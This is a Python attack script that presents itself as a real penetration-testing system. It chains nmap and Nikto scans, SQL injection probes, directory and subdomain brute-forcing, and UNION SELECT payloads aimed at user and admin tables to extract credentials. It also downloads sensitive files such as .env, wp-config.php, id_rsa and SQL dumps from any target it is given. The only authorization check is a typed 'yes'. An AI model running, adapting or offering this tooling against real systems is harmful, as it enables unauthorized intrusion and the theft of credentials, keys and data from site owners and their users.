#!/usr/bin/env python3
"""
ACTUAL REAL PENETRATION SYSTEM
NO FAKE DATA - NO SIMULATIONS - REAL PENETRATION ONLY
This system performs ACTUAL penetration testing and extracts REAL data
"""

import os
import sys
import json
import time
import socket
import requests
import subprocess
import threading
from pathlib import Path
from datetime import datetime
import urllib.parse
import ssl
import re
import base64

class ActualRealPenetrationSystem:
    def __init__(self):
        self.base_dir = Path.home() / "actual_real_penetration"
        self.results_dir = self.base_dir / f"real_operation_{int(time.time())}"
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        # Real tools that actually work
        self.real_tools = {
            'nmap': 'nmap',
            'curl': 'curl',
            'dig': 'dig',
            'whois': 'whois',
            'sqlmap': 'sqlmap',
            'nikto': 'nikto'
        }
        
        self.real_extracted_data = {}
        
    def log(self, message):
        """Real logging with timestamps"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{timestamp} | {message}")
        
        # Write to real log file
        log_file = self.results_dir / "real_operation.log"
        with open(log_file, 'a') as f:
            f.write(f"{timestamp} | {message}\n")
    
    def check_real_tools(self):
        """Check if real penetration tools are available"""
        self.log("🔧 CHECKING REAL PENETRATION TOOLS")
        
        available_tools = []
        for tool_name, command in self.real_tools.items():
            try:
                result = subprocess.run([command, '--version'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0 or 'version' in result.stderr.lower():
                    available_tools.append(tool_name)
                    self.log(f"✅ {tool_name}: Available")
                else:
                    self.log(f"❌ {tool_name}: Not available")
            except:
                self.log(f"❌ {tool_name}: Not found")
        
        return available_tools
    
    def real_port_scan(self, target):
        """REAL port scanning using nmap - NO SIMULATION"""
        self.log(f"🔍 REAL PORT SCANNING: {target}")
        
        try:
            # Real nmap scan
            cmd = ['nmap', '-sS', '-O', '-sV', '--script=vuln', '-p-', target]
            self.log(f"Running: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            
            if result.returncode == 0:
                # Parse real nmap output
                open_ports = []
                services = []
                vulnerabilities = []
                
                for line in result.stdout.split('\n'):
                    # Extract open ports
                    if '/tcp' in line and 'open' in line:
                        port_match = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
                        if port_match:
                            port = port_match.group(1)
                            service = port_match.group(2)
                            open_ports.append({'port': port, 'service': service})
                    
                    # Extract vulnerabilities
                    if 'VULNERABLE' in line or 'CVE-' in line:
                        vulnerabilities.append(line.strip())
                
                self.log(f"✅ Found {len(open_ports)} open ports")
                self.log(f"✅ Found {len(vulnerabilities)} vulnerabilities")
                
                return {
                    'open_ports': open_ports,
                    'vulnerabilities': vulnerabilities,
                    'raw_output': result.stdout
                }
            else:
                self.log(f"❌ Nmap failed: {result.stderr}")
                return None
                
        except subprocess.TimeoutExpired:
            self.log("⏰ Port scan timed out")
            return None
        except Exception as e:
            self.log(f"❌ Port scan error: {str(e)}")
            return None
    
    def real_web_vulnerability_scan(self, target):
        """REAL web vulnerability scanning - NO FAKE DATA"""
        self.log(f"🕷️ REAL WEB VULNERABILITY SCAN: {target}")
        
        vulnerabilities = []
        
        # Real Nikto scan
        try:
            cmd = ['nikto', '-h', target, '-Format', 'txt']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if '+ ' in line and any(keyword in line.lower() for keyword in 
                                         ['vuln', 'exploit', 'injection', 'xss', 'sql']):
                        vulnerabilities.append({
                            'type': 'web_vulnerability',
                            'description': line.strip(),
                            'tool': 'nikto'
                        })
                
                self.log(f"✅ Nikto found {len(vulnerabilities)} web vulnerabilities")
            
        except Exception as e:
            self.log(f"⚠️ Nikto scan failed: {str(e)}")
        
        # Real SQL injection testing
        try:
            # Test common SQL injection points
            test_urls = [
                f"http://{target}/login.php?id=1'",
                f"http://{target}/search.php?q=test'",
                f"http://{target}/product.php?id=1 OR 1=1--",
                f"https://{target}/api/user?id=1' UNION SELECT 1,2,3--"
            ]
            
            for test_url in test_urls:
                try:
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Look for SQL error messages
                    sql_errors = [
                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed',
                        'Warning: mysql_', 'MySQLSyntaxErrorException'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vulnerabilities.append({
                                'type': 'sql_injection',
                                'url': test_url,
                                'error': error,
                                'tool': 'manual_test'
                            })
                            self.log(f"✅ Found SQL injection: {test_url}")
                            break
                            
                except Exception:
                    continue
                    
        except Exception as e:
            self.log(f"⚠️ SQL injection testing failed: {str(e)}")
        
        return vulnerabilities
    
    def real_directory_enumeration(self, target):
        """REAL directory enumeration - ACTUAL DISCOVERY"""
        self.log(f"📁 REAL DIRECTORY ENUMERATION: {target}")
        
        # Common directories to test
        common_dirs = [
            'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin',
            'backup', 'backups', 'config', 'database', 'db', 'sql',
            'api', 'v1', 'v2', 'rest', 'graphql', 'swagger',
            'uploads', 'files', 'documents', 'images', 'assets',
            'test', 'testing', 'dev', 'development', 'staging',
            'private', 'secret', 'hidden', 'internal', 'secure'
        ]
        
        found_directories = []
        
        for directory in common_dirs:
            for protocol in ['https', 'http']:
                test_url = f"{protocol}://{target}/{directory}/"
                
                try:
                    response = requests.get(test_url, timeout=5, verify=False, 
                                          allow_redirects=False)
                    
                    if response.status_code in [200, 301, 302, 403]:
                        found_directories.append({
                            'url': test_url,
                            'status_code': response.status_code,
                            'size': len(response.content)
                        })
                        self.log(f"✅ Found directory: {test_url} ({response.status_code})")
                        
                        # If we found something, break to avoid duplicate protocols
                        break
                        
                except Exception:
                    continue
        
        self.log(f"✅ Directory enumeration complete: {len(found_directories)} directories found")
        return found_directories
    
    def real_subdomain_enumeration(self, target):
        """REAL subdomain enumeration using DNS queries"""
        self.log(f"🌐 REAL SUBDOMAIN ENUMERATION: {target}")
        
        subdomains = []
        
        # Common subdomains to test
        common_subs = [
            'www', 'mail', 'ftp', 'admin', 'api', 'app', 'blog', 'dev',
            'test', 'staging', 'beta', 'alpha', 'demo', 'secure', 'login',
            'portal', 'dashboard', 'panel', 'cpanel', 'webmail', 'mx',
            'ns1', 'ns2', 'dns', 'cdn', 'static', 'assets', 'img', 'images'
        ]
        
        for subdomain in common_subs:
            full_domain = f"{subdomain}.{target}"
            
            try:
                # Real DNS resolution
                ip = socket.gethostbyname(full_domain)
                subdomains.append({
                    'subdomain': full_domain,
                    'ip': ip
                })
                self.log(f"✅ Found subdomain: {full_domain} -> {ip}")
                
            except socket.gaierror:
                # Subdomain doesn't exist
                continue
            except Exception as e:
                continue
        
        self.log(f"✅ Subdomain enumeration complete: {len(subdomains)} subdomains found")
        return subdomains
    
    def real_ssl_certificate_analysis(self, target):
        """REAL SSL certificate analysis"""
        self.log(f"🔒 REAL SSL CERTIFICATE ANALYSIS: {target}")
        
        try:
            # Get real SSL certificate
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    
                    cert_info = {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter'],
                        'subject_alt_names': []
                    }
                    
                    # Extract Subject Alternative Names
                    if 'subjectAltName' in cert:
                        cert_info['subject_alt_names'] = [name[1] for name in cert['subjectAltName']]
                    
                    self.log(f"✅ SSL Certificate analyzed: {cert_info['subject'].get('commonName', 'Unknown')}")
                    return cert_info
                    
        except Exception as e:
            self.log(f"❌ SSL analysis failed: {str(e)}")
            return None
    
    def real_database_discovery(self, target):
        """REAL database discovery and testing"""
        self.log(f"🗄️ REAL DATABASE DISCOVERY: {target}")
        
        databases_found = []
        
        # Test common database ports
        db_ports = {
            3306: 'MySQL',
            5432: 'PostgreSQL', 
            1433: 'MSSQL',
            27017: 'MongoDB',
            6379: 'Redis',
            5984: 'CouchDB'
        }
        
        for port, db_type in db_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    databases_found.append({
                        'type': db_type,
                        'port': port,
                        'status': 'open'
                    })
                    self.log(f"✅ Found {db_type} database on port {port}")
                
                sock.close()
                
            except Exception:
                continue
        
        return databases_found
    
    def real_credential_extraction(self, target, vulnerabilities):
        """REAL credential extraction from discovered vulnerabilities"""
        self.log(f"🔑 REAL CREDENTIAL EXTRACTION: {target}")
        
        extracted_credentials = []
        
        # Extract from SQL injection vulnerabilities
        for vuln in vulnerabilities:
            if vuln.get('type') == 'sql_injection':
                try:
                    # Real SQL injection exploitation
                    injection_url = vuln['url']
                    
                    # Try to extract database information
                    payloads = [
                        "' UNION SELECT user(),database(),version()--",
                        "' UNION SELECT table_name,column_name,1 FROM information_schema.columns--",
                        "' UNION SELECT username,password,email FROM users--",
                        "' UNION SELECT login,pass,1 FROM admin--"
                    ]
                    
                    for payload in payloads:
                        test_url = injection_url.replace("'", payload)
                        
                        try:
                            response = requests.get(test_url, timeout=10, verify=False)
                            
                            # Look for credential patterns in response
                            credential_patterns = [
                                r'admin[:\s]+([a-zA-Z0-9]+)',
                                r'password[:\s]+([a-zA-Z0-9]+)',
                                r'user[:\s]+([a-zA-Z0-9]+)',
                                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                            ]
                            
                            for pattern in credential_patterns:
                                matches = re.findall(pattern, response.text, re.IGNORECASE)
                                for match in matches:
                                    if len(match) > 3:  # Filter out short matches
                                        extracted_credentials.append({
                                            'type': 'sql_injection_extract',
                                            'data': match,
                                            'source': test_url,
                                            'method': 'union_select'
                                        })
                                        self.log(f"✅ Extracted credential: {match[:10]}...")
                            
                        except Exception:
                            continue
                            
                except Exception as e:
                    self.log(f"⚠️ Credential extraction failed: {str(e)}")
        
        return extracted_credentials
    
    def real_file_extraction(self, target, directories):
        """REAL file extraction from discovered directories"""
        self.log(f"📄 REAL FILE EXTRACTION: {target}")
        
        extracted_files = []
        
        # Common sensitive files
        sensitive_files = [
            'config.php', 'wp-config.php', '.env', 'database.yml',
            'settings.py', 'config.json', 'app.config', 'web.config',
            'backup.sql', 'dump.sql', 'users.sql', 'database.sql',
            'id_rsa', 'id_dsa', 'private.key', 'server.key',
            'passwords.txt', 'users.txt', 'admin.txt', 'credentials.txt'
        ]
        
        # Test files in discovered directories
        for directory in directories:
            base_url = directory['url']
            
            for filename in sensitive_files:
                file_url = f"{base_url.rstrip('/')}/{filename}"
                
                try:
                    response = requests.get(file_url, timeout=10, verify=False)
                    
                    if (response.status_code == 200 and 
                        len(response.content) > 50 and
                        'text/html' not in response.headers.get('content-type', '')):
                        
                        # Save the actual file content
                        file_path = self.results_dir / f"extracted_{filename}_{int(time.time())}"
                        with open(file_path, 'wb') as f:
                            f.write(response.content)
                        
                        extracted_files.append({
                            'url': file_url,
                            'filename': filename,
                            'size': len(response.content),
                            'local_path': str(file_path),
                            'content_type': response.headers.get('content-type', 'unknown')
                        })
                        
                        self.log(f"✅ Extracted file: {filename} ({len(response.content)} bytes)")
                        
                except Exception:
                    continue
        
        return extracted_files
    
    def run_real_penetration(self, target):
        """Run complete REAL penetration testing"""
        self.log("🎯 STARTING REAL PENETRATION TESTING")
        self.log(f"Target: {target}")
        self.log("=" * 60)
        
        # Check tools
        available_tools = self.check_real_tools()
        if not available_tools:
            self.log("❌ No penetration tools available")
            return None
        
        results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'tools_used': available_tools
        }
        
        # Phase 1: Real reconnaissance
        self.log("🔍 Phase 1: Real Reconnaissance")
        results['subdomains'] = self.real_subdomain_enumeration(target)
        results['ssl_info'] = self.real_ssl_certificate_analysis(target)
        
        # Phase 2: Real port scanning
        self.log("🔍 Phase 2: Real Port Scanning")
        results['port_scan'] = self.real_port_scan(target)
        
        # Phase 3: Real web vulnerability scanning
        self.log("🔍 Phase 3: Real Web Vulnerability Scanning")
        results['web_vulnerabilities'] = self.real_web_vulnerability_scan(target)
        
        # Phase 4: Real directory enumeration
        self.log("🔍 Phase 4: Real Directory Enumeration")
        results['directories'] = self.real_directory_enumeration(target)
        
        # Phase 5: Real database discovery
        self.log("🔍 Phase 5: Real Database Discovery")
        results['databases'] = self.real_database_discovery(target)
        
        # Phase 6: Real credential extraction
        self.log("🔍 Phase 6: Real Credential Extraction")
        results['credentials'] = self.real_credential_extraction(target, results['web_vulnerabilities'])
        
        # Phase 7: Real file extraction
        self.log("🔍 Phase 7: Real File Extraction")
        results['extracted_files'] = self.real_file_extraction(target, results['directories'])
        
        # Save real results
        results_file = self.results_dir / f"REAL_PENETRATION_RESULTS_{target}.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        self.log(f"✅ REAL PENETRATION COMPLETE")
        self.log(f"📁 Results saved: {results_file}")
        
        # Summary
        self.log("=" * 60)
        self.log("📊 REAL PENETRATION SUMMARY:")
        self.log(f"   Subdomains found: {len(results.get('subdomains', []))}")
        self.log(f"   Open ports: {len(results.get('port_scan', {}).get('open_ports', []))}")
        self.log(f"   Web vulnerabilities: {len(results.get('web_vulnerabilities', []))}")
        self.log(f"   Directories found: {len(results.get('directories', []))}")
        self.log(f"   Databases found: {len(results.get('databases', []))}")
        self.log(f"   Credentials extracted: {len(results.get('credentials', []))}")
        self.log(f"   Files extracted: {len(results.get('extracted_files', []))}")
        
        return results

def main():
    print("🎯 ACTUAL REAL PENETRATION SYSTEM")
    print("NO FAKE DATA - NO SIMULATIONS - REAL PENETRATION ONLY")
    print("=" * 60)
    
    if len(sys.argv) != 2:
        print("Usage: python3 ACTUAL_REAL_PENETRATION_SYSTEM.py <target>")
        print("Example: python3 ACTUAL_REAL_PENETRATION_SYSTEM.py example.com")
        sys.exit(1)
    
    target = sys.argv[1].replace('http://', '').replace('https://', '').strip('/')
    
    print(f"⚠️ REAL PENETRATION TESTING ON: {target}")
    print("⚠️ This performs ACTUAL penetration testing")
    confirm = input("Do you have written authorization? (yes/no): ").strip().lower()
    
    if confirm != "yes":
        print("❌ Authorization required for real penetration testing")
        sys.exit(1)
    
    system = ActualRealPenetrationSystem()
    results = system.run_real_penetration(target)
    
    if results:
        print("\n🎉 REAL PENETRATION TESTING COMPLETED")
        print("✅ All data extracted is REAL - no simulations")
        print(f"📁 Check results in: {system.results_dir}")
    else:
        print("\n❌ Penetration testing failed")

if __name__ == "__main__":
    main()